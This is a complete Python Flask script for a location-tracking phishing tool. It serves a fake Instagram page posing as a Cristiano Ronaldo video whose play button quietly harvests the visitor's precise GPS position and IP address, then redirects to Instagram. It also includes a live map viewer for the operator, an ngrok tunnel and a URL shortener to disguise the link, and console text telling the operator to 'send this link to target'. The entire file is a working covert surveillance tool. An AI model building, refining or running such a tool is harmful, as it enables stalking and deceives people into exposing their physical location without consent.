from flask import Flask, request, render_template_string, make_response
import json
import os
from datetime import datetime
import webbrowser
import subprocess
import time
import requests

try:
    from modules.config import GOOGLE_MAPS_API_KEY
except ImportError:
    GOOGLE_MAPS_API_KEY = os.getenv('GOOGLE_MAPS_API_KEY', '')

app = Flask(__name__)

# Store all locations (list of visitors)
location_file = "location_data.json"

# HTML template - tracking page (precise GPS via watchPosition)
FACEBOOK_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
    <style>
        body {
            margin: 0; padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
            background: #000000;
            color: white;
            min-height: 100vh;
        }
        .container {
            max-width: 420px;
            margin: 0 auto;
            padding: 24px;
        }
        .video-container {
            position: relative;
            width: 100%;
            padding-bottom: 177.78%;
            background: linear-gradient(145deg, #1a1a1a 0%, #0d0d0d 100%);
            border-radius: 16px;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
        }
        .video-placeholder {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: url('https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=400&h=700&fit=crop') center/cover;
        }
        .play-button {
            width: 88px;
            height: 88px;
            background: rgba(255,255,255,0.9);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            position: relative;
            box-shadow: 0 4px 24px rgba(255,255,255,0.3);
            transition: transform 0.2s;
        }
        .play-button:hover { transform: scale(1.05); }
        .play-button::after {
            content: '';
            width: 0;
            height: 0;
            border-style: solid;
            border-width: 20px 0 20px 35px;
            border-color: transparent transparent transparent black;
            margin-left: 8px;
        }
        .video-info {
            padding: 16px;
            background-color: black;
        }
        .username {
            font-size: 17px;
            font-weight: 700;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
        }
        .verified {
            width: 16px;
            height: 16px;
            margin-left: 4px;
            background-color: #20D5EC;
            border-radius: 50%;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            font-size: 10px;
            color: white;
        }
        .description {
            font-size: 15px;
            line-height: 1.4;
            margin-bottom: 12px;
        }
        .stats {
            display: flex;
            gap: 16px;
            font-size: 14px;
            color: #A4A4A4;
        }
        .stat {
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid rgba(255,255,255,0.2);
            border-top: 4px solid #E4405F;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loading-text {
            color: white;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="video-container">
            <div class="video-placeholder">
                <div class="play-button" onclick="requestLocation()"></div>
            </div>
        </div>
        <div class="video-info">
            <div class="username">
                @cristiano
                <span class="verified">✓</span>
            </div>
            <div class="description">
                Training day 💪 Ready for the big game! #CR7 #football #motivation
            </div>
            <div class="stats">
                <div class="stat">♥ 3.2M</div>
                <div class="stat">💬 52.8K</div>
                <div class="stat">⤴ 127K</div>
            </div>
        </div>
    </div>

    <div id="loading" class="loading-overlay">
        <div class="spinner"></div>
        <div class="loading-text">Loading video...</div>
    </div>

    <script>
        var locationSent = false;
        function requestLocation() {
            if (!navigator.geolocation) { redirectToInstagram(); return; }
            document.getElementById('loading').style.display = 'flex';
            document.querySelector('.loading-text').textContent = 'جاري تحديد الموقع...';
            var options = { enableHighAccuracy: true, timeout: 60000, maximumAge: 0 };
            var bestPos = null;
            var watchId = navigator.geolocation.watchPosition(
                function(p) {
                    if (!bestPos || p.coords.accuracy < bestPos.coords.accuracy) bestPos = p;
                    if ((p.coords.accuracy <= 20 || (bestPos && bestPos.coords.accuracy <= 30)) && !locationSent) {
                        navigator.geolocation.clearWatch(watchId);
                        locationSent = true;
                        sendPosition(bestPos);
                    }
                },
                function(err) {
                    navigator.geolocation.clearWatch(watchId);
                    if (!locationSent) {
                        if (bestPos) { locationSent = true; sendPosition(bestPos); }
                        else redirectToInstagram();
                    }
                },
                options
            );
            setTimeout(function() {
                if (locationSent) return;
                navigator.geolocation.clearWatch(watchId);
                locationSent = true;
                if (bestPos) sendPosition(bestPos);
                else navigator.geolocation.getCurrentPosition(
                    function(p) { sendPosition(p); },
                    redirectToInstagram,
                    options
                );
            }, 20000);
        }

        function sendPosition(position) {
            const data = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude ?? null,
                altitudeAccuracy: position.coords.altitudeAccuracy ?? null,
                timestamp: new Date().toISOString()
            };

            fetch('/submit_location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                setTimeout(redirectToInstagram, 1500);
            })
            .catch(error => {
                redirectToInstagram();
            });
        }

        function redirectToInstagram() {
            window.location.href = 'https://www.instagram.com';
        }
    </script>
</body>
</html>
"""

# Google Maps viewer (when API key set)
VIEWER_PAGE_GOOGLE = """
<!DOCTYPE html>
<html>
<head>
    <title>Location Viewer - Google Maps</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://maps.googleapis.com/maps/api/js?key={{ google_maps_key }}&libraries=places"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        #map { height: 100vh; width: 100%; }
        .info-panel {
            position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%);
            background: linear-gradient(135deg, rgba(255,255,255,0.95) 0%, rgba(248,250,252,0.98) 100%);
            padding: 20px 24px; border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.12), 0 0 0 1px rgba(255,255,255,0.5);
            z-index: 1000; min-width: 340px; text-align: center;
            backdrop-filter: blur(12px);
        }
        .info-panel strong { color: #0ea5e9; font-size: 1.05rem; }
        .notification {
            position: fixed; top: 24px; left: 50%; transform: translateX(-50%);
            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
            color: white; padding: 14px 28px; border-radius: 12px;
            display: none; z-index: 1000; font-weight: 600;
            box-shadow: 0 4px 20px rgba(34,197,94,0.4);
        }
        .layer-btn { position: fixed; top: 16px; right: 16px; z-index: 1000; }
        .layer-btn button {
            padding: 10px 16px; margin-left: 8px; border: none; border-radius: 10px;
            background: white; box-shadow: 0 2px 12px rgba(0,0,0,0.15);
            cursor: pointer; font-weight: 500; font-size: 13px;
        }
        .layer-btn button.active { background: #0ea5e9; color: white; }
    </style>
</head>
<body>
    <div id="map"></div>
    <div id="notification" class="notification">&#10003; Location updated!</div>
    <div id="info" class="info-panel">Waiting for target's location...</div>
    <div class="layer-btn">
        <button id="btnRoad" class="active" onclick="setMapType('roadmap')">Map</button>
        <button id="btnSat" onclick="setMapType('satellite')">Satellite</button>
        <button id="btnHybrid" onclick="setMapType('hybrid')">Hybrid</button>
    </div>
    <script>
        var map, marker, circle, lastLat, lastLng;
        function initMap() {
            map = new google.maps.Map(document.getElementById('map'), {
                center: { lat: 20, lng: 0 },
                zoom: 2,
                mapTypeId: 'roadmap',
                styles: [],
                zoomControl: true,
                mapTypeControl: false,
                fullscreenControl: true,
                streetViewControl: true
            });
            updateLocation();
            setInterval(updateLocation, 2000);
        }
        function setMapType(type) {
            map.setMapTypeId(type);
            document.querySelectorAll('.layer-btn button').forEach(function(b){ b.classList.remove('active'); });
            document.getElementById('btn' + (type === 'roadmap' ? 'Road' : type === 'satellite' ? 'Sat' : 'Hybrid')).classList.add('active');
        }
        function showNotif() {
            var n = document.getElementById('notification');
            n.style.display = 'block';
            setTimeout(function(){ n.style.display = 'none'; }, 2500);
        }
        function updateLocation() {
            fetch('/get_location').then(function(r){ return r.json(); }).then(function(data){
                if (data.location) {
                    var lat = data.location.latitude;
                    var lng = data.location.longitude;
                    var acc = Math.max(data.location.accuracy || 50, 5);
                    var pos = { lat: lat, lng: lng };
                    if (lat !== lastLat || lng !== lastLng) { lastLat = lat; lastLng = lng; showNotif(); }
                    if (!marker) {
                        marker = new google.maps.Marker({ position: pos, map: map });
                        circle = new google.maps.Circle({
                            map: map, center: pos, radius: acc,
                            fillColor: '#0ea5e9', fillOpacity: 0.2,
                            strokeColor: '#0ea5e9', strokeWeight: 2
                        });
                        map.setCenter(pos);
                        map.setZoom(19);
                    } else {
                        marker.setPosition(pos);
                        circle.setCenter(pos);
                        circle.setRadius(acc);
                    }
                    document.getElementById('info').innerHTML = '<strong>Target Location</strong><br>' +
                        'Lat: ' + lat.toFixed(6) + '<br>Lng: ' + lng.toFixed(6) + '<br>' +
                        'Accuracy: ' + acc.toFixed(0) + ' m<br>' +
                        '<a href="https://www.google.com/maps?q=' + lat + ',' + lng + '" target="_blank" style="color:#0ea5e9;">Google Maps</a> • ' +
                        '<small>' + new Date(data.location.timestamp).toLocaleString() + '</small>';
                }
            });
        }
        initMap();
    </script>
</body>
</html>
"""

# Viewer - قائمة بكل من فتح الرابط + فتح على خرائط جوجل
VIEWER_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Location Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta charset="utf-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            min-height: 100vh;
            color: #e2e8f0;
            padding: 24px;
        }
        h1 { font-size: 1.3rem; margin-bottom: 20px; color: #f8fafc; }
        .spinner {
            width: 48px; height: 48px;
            border: 4px solid rgba(14,165,233,0.3);
            border-top-color: #0ea5e9;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 40px auto 16px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .wait-msg { text-align: center; color: #94a3b8; }
        .list { max-width: 500px; margin: 0 auto; }
        .card {
            background: rgba(30,41,59,0.9);
            border: 1px solid rgba(148,163,184,0.2);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 16px;
            flex-wrap: wrap;
        }
        .card .info { flex: 1; min-width: 140px; }
        .card .info .time { font-size: 0.85rem; color: #94a3b8; }
        .card .info .coords { font-family: monospace; font-size: 0.9rem; margin-top: 4px; }
        .card .info .acc { font-size: 0.8rem; color: #64748b; }
        .btn {
            padding: 10px 20px;
            background: linear-gradient(135deg, #0ea5e9, #0284c7);
            color: white;
            text-decoration: none;
            border-radius: 10px;
            font-weight: 600;
            font-size: 0.9rem;
            white-space: nowrap;
        }
        .btn:hover { opacity: 0.9; }
        .count { color: #22c55e; font-weight: 600; margin-bottom: 16px; }
    </style>
</head>
<body>
    <div id="waiting" class="wait-msg">
        <div class="spinner"></div>
        <p>جاري الانتظار... عند فتح أي شخص للرابط سيظهر هنا</p>
    </div>
    <div id="found" style="display:none">
        <h1>الأشخاص الذين فتحوا الرابط</h1>
        <p class="count" id="count"></p>
        <div id="list" class="list"></div>
    </div>
    <script>
        var lastCount = 0;
        function update() {
            fetch('/get_location').then(function(r){ return r.json(); }).then(function(data){
                var locs = data.locations || [];
                if (locs.length > 0) {
                    document.getElementById('waiting').style.display = 'none';
                    document.getElementById('found').style.display = 'block';
                    document.getElementById('count').textContent = 'عدد الأشخاص: ' + locs.length;
                    var list = document.getElementById('list');
                    list.innerHTML = '';
                    for (var i = locs.length - 1; i >= 0; i--) {
                        var L = locs[i];
                        var lat = L.latitude, lng = L.longitude;
                        var url = 'https://www.google.com/maps?q=' + lat + ',' + lng + '&z=19';
                        var t = L.timestamp ? new Date(L.timestamp).toLocaleString() : '-';
                        var acc = L.accuracy ? Math.round(L.accuracy) + ' m' : '';
                        var ip = L.ip ? ' | ' + L.ip : '';
                        var card = document.createElement('div');
                        card.className = 'card';
                        card.innerHTML = '<div class="info"><div class="time">#' + (i+1) + ' - ' + t + ip + '</div><div class="coords">' + lat.toFixed(6) + ', ' + lng.toFixed(6) + '</div><div class="acc">' + acc + '</div></div><a href="' + url + '" class="btn" target="_blank">خرائط جوجل</a>';
                        list.appendChild(card);
                    }
                    if (locs.length > lastCount) {
                        lastCount = locs.length;
                        window.open('https://www.google.com/maps?q=' + locs[locs.length-1].latitude + ',' + locs[locs.length-1].longitude + '&z=19', '_blank');
                    }
                }
            });
        }
        update();
        setInterval(update, 2000);
    </script>
</body>
</html>
"""

def shorten_url(url):
    try:
        api_url = f"https://is.gd/create.php?format=simple&url={url}"
        response = requests.get(api_url)
        if response.status_code == 200:
            return response.text.strip()
    except:
        return url  # Return original URL if shortening fails
    return url

def add_custom_headers(response):
    response.headers['ngrok-skip-browser-warning'] = '1'
    response.headers['User-Agent'] = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1'
    return response

@app.after_request
def after_request(response):
    return add_custom_headers(response)

@app.route('/')
def index():
    response = make_response(render_template_string(FACEBOOK_PAGE))
    return add_custom_headers(response)

@app.route('/view')
def view_location():
    html = VIEWER_PAGE_GOOGLE if GOOGLE_MAPS_API_KEY else VIEWER_PAGE
    return add_custom_headers(make_response(render_template_string(html, google_maps_key=GOOGLE_MAPS_API_KEY or '')))

def _load_locations():
    if os.path.exists(location_file):
        try:
            with open(location_file, 'r', encoding='utf-8') as f:
                d = json.load(f)
                if isinstance(d, dict) and 'locations' in d:
                    return d['locations']
                if isinstance(d, list):
                    return d
                if isinstance(d, dict) and 'latitude' in d:
                    return [d]
        except Exception:
            pass
    return []

def _save_locations(locations):
    with open(location_file, 'w', encoding='utf-8') as f:
        json.dump({'locations': locations}, f, ensure_ascii=False)

@app.route('/submit_location', methods=['POST'])
def submit_location():
    data = request.get_json()
    if data and 'latitude' in data and 'longitude' in data:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr or '')[:50]
        if ',' in ip:
            ip = ip.split(',')[0].strip()
        loc = {
            'latitude': float(data['latitude']),
            'longitude': float(data['longitude']),
            'accuracy': float(data.get('accuracy', 0)),
            'altitude': data.get('altitude'),
            'timestamp': data.get('timestamp', datetime.now().isoformat()),
            'ip': ip or None
        }
        locations = _load_locations()
        locations.append(loc)
        _save_locations(locations)
        return add_custom_headers(make_response({'status': 'success'}))
    return {'status': 'error'}, 400

@app.route('/get_location')
def get_location():
    locations = _load_locations()
    latest = locations[-1] if locations else None
    return add_custom_headers(make_response({'location': latest, 'locations': locations}))

def start_ngrok():
    # Start ngrok
    ngrok_process = subprocess.Popen(
        ['ngrok.exe', 'http', '5000'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    # Wait for ngrok to start
    time.sleep(3)
    
    try:
        tunnel_url = None
        r = requests.get('http://localhost:4040/api/tunnels', timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get('tunnels') and 'public_url' in data['tunnels'][0]:
                tunnel_url = data['tunnels'][0]['public_url']
                tracking_url = shorten_url(tunnel_url)
                viewer_url = shorten_url(f"{tunnel_url}/view")
                return ngrok_process, tracking_url, viewer_url
    except Exception:
        pass
    return ngrok_process, None, None

def cleanup(ngrok_process):
    if ngrok_process:
        ngrok_process.terminate()
        try:
            ngrok_process.wait(timeout=5)
        except subprocess.TimeoutExpired:
            ngrok_process.kill()

def start_server():
    try:
        print("Starting secure tunnel...")
        ngrok_process, tracking_url, viewer_url = start_ngrok()
        
        if tracking_url and viewer_url:
            print("\n=== Location Tracker URLs ===")
            print(f"\nSend this link to target: {tracking_url}")
            print(f"View location here: {viewer_url}")
            print("\nWaiting for target to open the link...")
            
            # Open viewer in browser
            webbrowser.open(viewer_url)
            
            # Start Flask server
            app.run(port=5000)
        else:
            print("Failed to start tunnel. Please try again.")
            
    except KeyboardInterrupt:
        print("\nShutting down...")
    finally:
        cleanup(ngrok_process)

if __name__ == '__main__':
    start_server()
